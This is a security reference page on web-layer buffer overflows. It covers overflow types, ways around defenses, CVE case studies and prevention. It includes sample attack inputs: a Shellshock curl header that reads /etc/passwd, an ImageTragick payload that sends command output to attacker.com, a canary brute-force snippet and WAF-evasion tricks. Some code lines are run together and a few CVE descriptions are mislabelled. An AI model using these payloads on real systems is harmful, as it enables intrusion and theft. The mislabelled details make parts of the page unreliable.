---
title: Buffer Overflow
---

# Buffer Overflow (Web Server / App Layer)

A Buffer Overflow occurs when a program writes more data to a buffer (a fixed-size memory region) than it can hold, overwriting adjacent memory. At the web/application layer, these vulnerabilities exist in the **underlying server software, native extensions, language runtimes, parsing libraries, and framework internals,** not just in standalone binary exploitation. When exploited, they can corrupt control flow, leak memory, crash services, or hand an attacker arbitrary code execution on the server, all triggered by a crafted HTTP request.

Unlike client-side or logic bugs, buffer overflows at this layer bypass the application entirely and attack the infrastructure it runs on.

## Types of Buffer Overflow Attacks

### 1. Stack-Based Buffer Overflow

The most classical form. A function allocates a fixed-size buffer on the stack; excess input overwrites the saved return address, letting an attacker redirect execution.

- Input is written into a local stack variable without bounds checking.
- The saved `EIP`/`RIP` (return address) is overwritten with an attacker-controlled address.
- Execution redirects to shellcode, a ROP chain, or a libc function (`ret2libc`).
- Common in C-based web server modules, CGI scripts, and native extensions.
- Triggered via oversized HTTP headers, query strings, multipart body fields, or URL paths.

```
GET /cgi-bin/search.cgi?query=AAAA...[4096 bytes]...AAAA HTTP/1.1
Host: target.com
# Overwrites return address on the stack inside the CGI binary
```

### 2. Heap-Based Buffer Overflow

Overflow occurs in heap-allocated memory. Instead of a return address, the attacker corrupts heap metadata, adjacent objects, or function pointers stored on the heap.

- Harder to exploit but equally dangerous; often leads to use-after-free or arbitrary write primitives.
- Common in image/document parsing libraries called by web apps (libpng, libtiff, libxml2).
- Triggers: uploading a malformed image, XML document, PDF, or multipart file.
- Exploited by grooming the heap layout to place attacker-controlled data adjacent to a target structure.

```
POST /api/upload HTTP/1.1
Content-Type: multipart/form-data; boundary=X

--X
Content-Disposition: form-data; name="file"; filename="evil.png"
[Crafted PNG with oversized IHDR chunk → heap overflow in libpng parser]
```

### 3. Integer Overflow → Buffer Overflow

An arithmetic overflow in a size calculation produces a smaller-than-expected allocation, which is then filled with attacker data — causing an overflow of the undersized buffer.

- A `size_t` or `int` variable wraps around (e.g., `0xFFFFFFFF + 1 = 0`).
- The resulting small allocation is written with the original large data.
- Common in chunked transfer encoding parsers, content-length handling, and custom binary protocol parsers in web servers.

```
POST /upload HTTP/1.1
Content-Length: 4294967295   ← 0xFFFFFFFF
[Server computes allocation as (length + 1) → wraps to 0 → tiny alloc → overflow]
```

### 4. Off-by-One Overflow

A boundary condition error writes exactly one byte (or element) past the end of a buffer — often due to incorrect loop termination (`<=` instead of `<`) or null-terminator mishandling.

- Small in scope but can overwrite the least-significant byte of a saved frame pointer (`EBP`), enabling frame pointer overwrite attacks.
- Common in custom HTTP header parsers, cookie parsers, and URL decoders.
- Less likely to crash immediately, making them harder to detect via fuzzing alone.

```
Cookie: session=[255 bytes of 'A'] → overwrites 1 byte past buffer
# Corrupts adjacent heap chunk header or LSB of saved EBP
```

### 5. Format String → Memory Corruption

While technically distinct, format string vulnerabilities in web-facing C components (logging functions, error handlers) can produce arbitrary read/write primitives equivalent to buffer overflows.

- Input is passed directly to `printf`, `sprintf`, `syslog` without a format string.
- `%n` writes the number of bytes printed so far to an attacker-controlled address.
- `%x` / `%s` leak stack content, enabling memory layout disclosure for follow-on overflow exploitation.

```
GET /page?msg=%x.%x.%x.%x.%n HTTP/1.1
# Leaks stack values; %n writes to an attacker-controlled pointer
```

### 6. HTTP Request Smuggling → Buffer Confusion

At the web layer, conflicting `Content-Length` and `Transfer-Encoding` headers between a front-end proxy and back-end server cause the backend to misparse request boundaries — effectively "overflowing" the logical request buffer of the backend parser.

- The front-end processes `Transfer-Encoding: chunked`; the back-end reads `Content-Length`.
- The attacker's "body" is interpreted as the beginning of the next HTTP request.
- Enables cache poisoning, WAF bypass, and internal request injection.

```
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED-PREFIX
```

## Attack Surface

- **Web Server Modules:** Apache `mod_rewrite`, `mod_ssl`, `mod_auth` — C-based modules parsing user-controlled headers/URIs.
- **CGI / FastCGI Scripts:** Native binaries invoked per-request, often written in C without modern protections.
- **TLS/SSL Handshake Parsers:** OpenSSL, BoringSSL — Heartbleed (CVE-2014-0160) is the canonical example of a heap over-read in this layer.
- **Media / Document Parsers:** Server-side image processing (ImageMagick, libpng, libjpeg), PDF rendering (Ghostscript), XML parsing (libexpat, libxml2).
- **Web Application Firewalls:** WAF rule engines written in C (ModSecurity) are themselves susceptible to malformed input.
- **Native Language Extensions:** PHP extensions (`.so`/`.dll`), Python C extensions (`ctypes`, Cython modules), Node.js native addons.
- **Database Drivers:** C-based connectors (libmysqlclient, libpq) invoked by web apps processing user-supplied query results.
- **Reverse Proxies & Load Balancers:** Nginx, HAProxy — HTTP/2 and WebSocket frame parsers.
- **WebSocket Frame Parsers:** Custom or library-based binary frame parsers receiving attacker-controlled lengths.
- **Deserialization Endpoints:** Native deserialization of binary formats (MessagePack, Protocol Buffers, BSON) in C extensions.

## Exploitation and Bypassing Defenses

Modern systems deploy multiple mitigations. Real-world exploitation chains bypass them in sequence.

### 1. Bypassing Stack Canaries

A random "canary" value is placed between the buffer and the return address; the function checks it before returning.

**Bypass Techniques:**

- **Leak the canary** via a format string bug or partial-overwrite information disclosure, then include it in the overflow payload.
- **Brute-force (fork-based servers):** In `fork()`based servers, the child inherits the parent's canary. Leak it byte-by-byte across multiple requests without crashing the parent.
- **Overwrite a different target:** Skip the return address; instead overwrite a function pointer or `__dtor_list` entry stored elsewhere on the stack or heap.

```python
# Brute-force canary byte-by-byte (fork server)
import socket

canary = b"\x00"  # canaries always start with null byte
for byte_pos in range(1, 4):
    for guess in range(0x00, 0x100):
        payload = b"A" * OFFSET + canary + bytes([guess])
        # Send payload; if no crash, byte is correct
        if send_and_check(payload):
            canary += bytes([guess])
            break
```

### 2. Bypassing ASLR (Address Space Layout Randomization)

ASLR randomizes the base addresses of stack, heap, and libraries on each execution.

**Bypass Techniques:**

- **Information Leak First:** Use a format string or partial-read vulnerability to leak a pointer from the stack or heap, then compute the base address of libc or the binary.
- **Partial Overwrite:** Overwrite only the low-order bytes of a saved pointer (ASLR doesn't randomize page offsets), redirecting to a gadget within the same page.
- **Heap Spray (web context):** Flood the heap with NOP sleds + shellcode via large number of requests; increases probability of hitting payload regardless of ASLR.
- **ret2plt / ret2libc:** Jump to functions already mapped at known relative offsets (PLT entries are at fixed offsets from the binary base).

### 3. Bypassing NX / DEP (Non-Executable Stack/Heap)

The OS marks stack and heap pages non-executable, so injected shellcode cannot run directly.

**Bypass Techniques:**

- **Return-Oriented Programming (ROP):** Chain together small existing code sequences ("gadgets") ending in `ret` to build arbitrary computation without injecting new code.
- **ret2libc:** Redirect execution to `system()` in libc with `/bin/sh` as the argument — no shellcode needed.
- **JIT Spraying (rare, browser-facing):** Abuse a JIT compiler to generate attacker-controlled executable code in JIT memory regions.

```
# ROP Chain structure for ret2libc
[PADDING][POP_RDI_GADGET]["/bin/sh" address][system() address]
# Gadgets found using ROPgadget or ropper against the server binary
```

### 4. Encoding & Obfuscation to Bypass WAF/IDS

WAFs may detect known overflow patterns (long repetitive strings, shellcode bytes) via signature matching.

- **URL Encoding:** `%41%41%41%41` instead of `AAAA` — WAF decodes after signature check.
- **Unicode Overlong Encoding:** `%c0%81` representing `/` in legacy parsers — bypasses path normalization checks.
- **Chunked Transfer Encoding Splitting:** Split the malicious payload across multiple chunks so no single chunk triggers a signature.
- **Case & Whitespace Variation in Headers:** `content-length` vs `Content-Length` — exploits case-insensitive parser inconsistencies.
- **Null Byte Injection:** `\x00` terminates C strings early in some parsers, truncating WAF inspection while the buffer still receives the full data.

```
POST /upload HTTP/1.1
Transfer-Encoding: chunked

5
AAAA\x00           ← WAF sees 5-byte chunk, C parser stops at null
[rest of payload in next chunk]
```

## Advanced Attack Scenarios

### 1. Heartbleed — Heap Over-Read via Missing Bounds Check (CVE-2014-0160)

The OpenSSL TLS Heartbeat extension accepted a `payload_length` field from the client without verifying it matched the actual payload size. The server read `payload_length` bytes from heap memory and returned them — leaking private keys, session tokens, and user data.

```python
# Simplified Heartbleed PoC structure
heartbeat_request = (
    b"\x18"           # Content Type: Heartbeat
    b"\x03\x02"       # TLS 1.1
    b"\x00\x03"       # Length: 3 bytes
    b"\x01"           # Heartbeat Type: Request
    b"\xff\xff"       # Payload Length: 65535 (actual payload: 0 bytes)
)
# Server reads 65535 bytes from heap and echoes them back
```

**Lesson:** A single missing bounds check on an attacker-controlled length field in a C parsing function exposed the private keys of ~17% of the internet's HTTPS servers.

### 2. Shellshock — Environment Variable Buffer Confusion in Bash CGI (CVE-2014-6271)

Bash parsed function definitions in environment variables and continued executing code after the function body — allowing arbitrary command execution via HTTP headers passed to CGI scripts.

```bash
# HTTP Header → Environment Variable → Bash execution
curl -H 'User-Agent: () { :; }; /bin/cat /etc/passwd' http://target.com/cgi-bin/status.cgi
# Bash processes the function definition, then executes /bin/cat /etc/passwd
```

**Web relevance:** Any HTTP header (User-Agent, Referer, Cookie, custom headers) becomes an environment variable in CGI — all are attacker-controlled injection points.

### 3. ImageMagick "ImageTragick" — Shell Injection via Malformed Image (CVE-2016-3714)

ImageMagick's policy files failed to restrict certain coders. A malformed image with an `https://` delegate URL triggered shell metacharacter expansion.

```
# Malicious MVG file uploaded as "image.jpg"
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/image.jpg"|curl http://attacker.com/`id`")'
pop graphic-context
```

**Web context:** Any endpoint accepting image uploads and passing them to ImageMagick (thumbnailing, resizing) is vulnerable — regardless of the web framework used.

### 4. HTTP/2 HPACK Header Decompression Overflow

HTTP/2 uses HPACK compression for headers. Malformed Huffman-encoded header blocks or oversized dynamic table entries can overflow internal parsing buffers in C-based HTTP/2 implementations (nghttp2, h2o).

```python
# Craft oversized HPACK dynamic table entry
# Send header with extremely large value to overflow dynamic table
headers = [(':method', 'GET'), (':path', '/'), ('x-overflow', 'A' * 65535)]
# In vulnerable implementations, dynamic table update overflows heap buffer
```

## Framework-Specific Scenarios

### PHP — Native Extension Overflows

PHP's C extensions (GD, exif, zip, mbstring) process user-supplied files/strings in native code. Overflows in these extensions are reachable from PHP code without any unsafe PHP itself.

```php
// Triggers exif extension buffer overflow (CVE-2019-11042)
$exif = exif_read_data($_FILES['upload']['tmp_name']);
// A crafted JPEG with a malformed IFD entry overflows a heap buffer in ext/exif
```

**Key CVEs:** CVE-2019-11042 (exif), CVE-2018-17082 (Apache2 PHP), CVE-2020-7059 (mbstring).

### Node.js — Native Addon & Buffer Misuse

Node.js `Buffer` objects bypass V8's garbage collector. Misuse of `Buffer.allocUnsafe()` or vulnerable native addons can expose uninitialized memory or cause overflows.

```jsx
// Unsafe: exposes uninitialized heap memory
const buf = Buffer.allocUnsafe(1024);
// If echoed back to user before being filled, leaks heap content (analogous to Heartbleed)

// Vulnerable native addon call
const native = require('./native_module');
native.processInput(req.body); // C++ addon with no bounds check on input length
```

**Attack vector:** Oversized JSON body or binary WebSocket frame routed to a native addon.

### Python — C Extensions / ctypes

Python's safety guarantees don't extend to C extensions or `ctypes` calls.

```python
import ctypes

# Loading a vulnerable shared library and passing user input
lib = ctypes.CDLL("./libparser.so")
lib.parse_header(user_input)  # No bounds check in libparser → stack overflow

# PIL/Pillow: image processing overflows in libtiff, libwebp
from PIL import Image
img = Image.open(uploaded_file)  # Malformed WebP → CVE-2023-4863 (libwebp heap overflow)
```

**Notable:** CVE-2023-4863 (libwebp) affected any Python app using Pillow for WebP processing.

### Java — JNI and Native Memory

Java's JVM doesn't overflow managed heap, but JNI calls into native libraries and direct `ByteBuffer` operations in native code are unprotected.

```java
// JNI call to native XML parser
public native String parseXml(byte[] data);  // libexpat underneath
// If data contains a malformed entity expansion → heap overflow in libexpat (CVE-2022-25313)

// Unsafe direct buffer — off-heap (C malloc); overflow bypasses JVM protections
ByteBuffer buf = ByteBuffer.allocateDirect(1024);
```

### Go — Unsafe Package & CGo

Go's type system prevents buffer overflows in pure Go — but `unsafe.Pointer` and CGo remove those guarantees.

```go
import "unsafe"

// Unsafe pointer arithmetic — can read/write beyond intended bounds
ptr := unsafe.Pointer(&slice[0])
// Advance beyond slice bounds → reads adjacent heap memory

// CGo calling vulnerable C library
// #include "libparser.h"
import "C"
C.parse((*C.char)(unsafe.Pointer(&input[0])), C.int(len(input)))
// No bounds check in C code → overflow
```

### Nginx / Apache — Module-Level Overflows

Web servers themselves have historically suffered buffer overflows in core modules.

```
# Apache mod_rewrite heap overflow (CVE-2017-9798 - Optionsbleed)
OPTIONS * HTTP/1.1
Host: target.com
# Apache reads past end of server memory in Allow header construction → heap over-read

# Nginx mp4 module stack overflow (CVE-2022-41741)
GET /video.mp4?start=<crafted_float> HTTP/1.1
# Malformed mp4 atom triggers stack overflow in ngx_http_mp4_module
```

## Detection Techniques

### Manual Detection

- **Fuzzing HTTP Inputs:** Send progressively longer values (powers of 2: 128, 256, 512 ... 65536 bytes) in every HTTP parameter — headers, cookies, path segments, body fields — and monitor for crashes or anomalous responses.
- **Memory Leak Probing:** Send requests with attacker-controlled length fields (Content-Length, chunk sizes, HPACK table sizes) set to values far exceeding the actual body; inspect responses for leaked memory bytes.
- **Error Message Analysis:** Stack traces, core dump paths, or memory addresses in error responses reveal the presence of native code and memory layout.
- **File Upload Fuzzing:** Submit malformed files (truncated headers, oversized metadata fields, recursive structures) targeting server-side parsers.
- **Differential Analysis:** Compare responses to normal vs. oversized inputs for timing differences, partial responses, or connection resets — signs of a crash/restart.

### Automated Detection

- **AFL++ / libFuzzer:** Industry-standard coverage-guided fuzzers for C/C++ server components and parsing libraries.
    
    ```bash
    afl-fuzz -i inputs/ -o findings/ -- ./webserver_parser @@
    ```
    
- **Boofuzz:** Python network fuzzing framework designed for protocol fuzzing over HTTP, WebSocket, and custom TCP.
    
    ```python
    from boofuzz import *session = Session(target=Target(connection=TCPSocketConnection("target.com", 80)))
    ```
    
- **OWASP ZAP Buffer Overflow Scanner:** Active scan rule that tests for overflows via oversized input injection across all detected parameters.
- **Burp Suite (Intruder + Extensions):** Use Intruder with incrementally growing payloads; `Backslash-Powered Scanner` extension detects memory corruption signatures in responses.
- **Valgrind / AddressSanitizer (ASAN):** Instrument the server binary in a test environment to detect out-of-bounds reads/writes at runtime.
    
    ```bash
    # Build with ASANgcc -fsanitize=address -o server server.c# Run and exercise the endpoint — ASAN reports exact overflow location
    ```
    
- **GDB + PEDA/pwndbg:** Dynamic analysis of server processes; set watchpoints on buffer boundaries and trace execution during fuzzing.

## Impact

- **Remote Code Execution (RCE):** The most severe outcome — an attacker gains arbitrary code execution on the server with the privileges of the web server process.
- **Denial of Service (DoS):** Crashing the web server or worker process, causing service outage — often easier to achieve than full exploitation.
- **Sensitive Memory Disclosure:** Heap over-reads (Heartbleed-style) leak cryptographic keys, session tokens, credentials, and other users' request data.
- **Privilege Escalation:** If the web server runs as root or a privileged user, RCE translates directly to full system compromise.
- **Lateral Movement:** A compromised web server is used as a pivot to attack internal databases, microservices, and back-end infrastructure.
- **Supply Chain Impact:** Overflows in widely used parsing libraries (libwebp, libpng, OpenSSL) affect every application linking against them — impact is multiplied across thousands of deployments.
- **Compliance & Legal Exposure:** Memory disclosure of PII or payment data constitutes a notifiable breach under GDPR, PCI-DSS, and HIPAA.

## Prevention Techniques

- **Use Memory-Safe Languages Where Possible:** Rewrite performance-critical web components in Rust or Go instead of C/C++. For extensions, prefer managed-language equivalents over native addons.
- **Enable Compiler Protections:** Build all native components with `fstack-protector-strong` (canaries), `D_FORTIFY_SOURCE=2` (bounds checking on libc calls), and `Wformat -Werror=format-security` (format string protection).
- **Enable OS-Level Mitigations:** Ensure ASLR (`sysctl kernel.randomize_va_space=2`), NX/DEP, and PIE (Position Independent Executable) are active for all server processes.
- **Strict Input Bounds Checking:** Validate all length fields, size parameters, and array indices against known-good ranges before any memory allocation or copy operation in native code.
- **Sandboxing & Privilege Separation:** Run web server workers, CGI handlers, and media processors in sandboxes (seccomp, AppArmor, Docker with restricted capabilities) so RCE doesn't equal full host compromise.
- **Dependency Management & Patching:** Track CVEs for all C/C++ libraries used by the stack (OpenSSL, libpng, libxml2, ImageMagick). Subscribe to security advisories and patch within SLA.
- **Fuzzing in CI/CD:** Integrate `AFL++` or `libFuzzer` into the build pipeline for any native parsing component. Block releases on new crash findings.
- **Disable Unused Server Modules:** Remove or disable web server modules that are not needed (e.g., `mod_status`, `ngx_http_mp4_module`) to reduce attack surface.
- **Rate Limiting & Request Size Caps:** Enforce maximum request body size, header length, and URI length at the reverse proxy level to prevent resource-exhaustion-based heap manipulation.
- **Use Safe String/Memory Functions:** Replace `strcpy`, `sprintf`, `gets` with `strncpy`, `snprintf`, `fgets` and prefer `strlcpy`/`strlcat` where available.

## Tools

| Tool | Category | Use Case |
| --- | --- | --- |
| `testssl.sh` | Recon | TLS-layer overflow surface identification (Heartbleed, POODLE) |
| `AFL++` | Fuzzing | Coverage-guided fuzzing of native server components and parsers |
| `libFuzzer` | Fuzzing | In-process fuzzing for C/C++ libraries (integrate with ASAN) |
| `Boofuzz` | Fuzzing | Network-level HTTP/WebSocket protocol fuzzing |
| `Burp Suite` | Web Proxy | Manual overflow probing via Intruder; response analysis |
| `OWASP ZAP` | Scanner | Automated buffer overflow active scan across HTTP parameters |
| `GDB + pwndbg` | Debugger | Dynamic analysis; crash triage; ROP chain development |
| `ROPgadget` | Exploit Dev | ROP gadget discovery in server binaries and libraries |
| `Pwntools` | Exploit Dev | Python exploit scripting framework for binary exploitation |
| `Valgrind` | Memory Analysis | Runtime memory error detection (out-of-bounds, use-after-free) |
| `AddressSanitizer (ASAN)` | Memory Analysis | Compile-time instrumentation for precise overflow detection |
| `checksec` | Recon | Enumerate binary protections (NX, ASLR, canary, PIE, RELRO) |
| `Nmap NSE` | Recon | `http-shellshock`, `ssl-heartbleed` scripts for known CVE detection |
| `Metasploit` | Exploitation | Modules for Heartbleed, Shellshock, and historical web server CVEs |

## Good To Read

### Reports

- [**CVE-2023-3824: PHP PHAR Buffer Overflow Vulnerability](https://www.sentinelone.com/vulnerability-database/cve-2023-3824/)**
- [**Cloudflare (Cloudbleed, 2017 — Public Disclosure):** Buffer over-read in Cloudflare's HTML parser (`cf-html` module) leaked memory from adjacent HTTP requests — exposed tokens, cookies, and private data of unrelated users.](https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwiGl46GkrWTAxW9WHADHapqBcUQFnoECBoQAQ&url=https%3A%2F%2Fwww.rapid7.com%2Fblog%2Fpost%2F2017%2F02%2F24%2Fcloudflare-data-leakage-or-dare-i-saycloudbleed%2F&usg=AOvVaw2p4XCHXj-RB_zSecfRZXF7&opi=89978449)
- [**Ruby on Rails:** Integer overflow in `String#*` leading to heap buffer overflow when processing attacker-controlled multiplier values in a templating context.](https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwjdw46qkrWTAxW1a2wGHZBoDZMQFnoECBsQAQ&url=https%3A%2F%2Fwww.sentinelone.com%2Fvulnerability-database%2Fcve-2022-28739%2F&usg=AOvVaw2BxFihmOvl8RhG_13r_Uc3&opi=89978449)

### CVEs Worth Studying

- **CVE-2014-0160 (Heartbleed):** Heap over-read in OpenSSL TLS Heartbeat — the definitive web-layer memory disclosure vulnerability.
- **CVE-2014-6271 (Shellshock):** Bash environment variable buffer confusion exploitable via HTTP headers in CGI deployments.
- **CVE-2016-3714 (ImageTragick):** Shell metacharacter injection via malformed image — reachable from any image upload endpoint.
- **CVE-2021-41773 / 41524 (Apache):** Off-by-one and path normalization flaw in Apache 2.4.49/2.4.50 leading to RCE.
- **CVE-2022-41741 (Nginx mp4 module):** Stack overflow in Nginx's mp4 streaming module via crafted `start` parameter.
- **CVE-2023-4863 (libwebp):** Heap buffer overflow in WebP decoding — affected Chrome, Pillow, Electron, and every app using libwebp.

## References

- [OWASP Buffer Overflow Attack](https://owasp.org/www-community/attacks/Buffer_overflow_attack)
- [OWASP Testing Guide — OTG-INPVAL-014: Buffer Overflow Testing](https://owasp.org/www-project-web-security-testing-guide/)
- [Phrack Magazine — Smashing the Stack for Fun and Profit (Aleph One)](http://phrack.org/issues/49/14.html)
- [PortSwigger Research — HTTP Request Smuggling](https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn)
- [Google Project Zero Blog](https://googleprojectzero.blogspot.com/)
- [LiveOverflow — Binary Exploitation / Memory Corruption Series (YouTube)](https://www.youtube.com/c/LiveOverflow)
- [ROPemporium — ROP Chain Practice Challenges](https://ropemporium.com/)
- [Exploit Education — Phoenix (Web + Binary)](https://exploit.education/)
- [Cloudbleed Public Disclosure (Tavis Ormandy / Google Project Zero)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1139)
- [NIST NVD — CVE Search](https://nvd.nist.gov/vuln/search)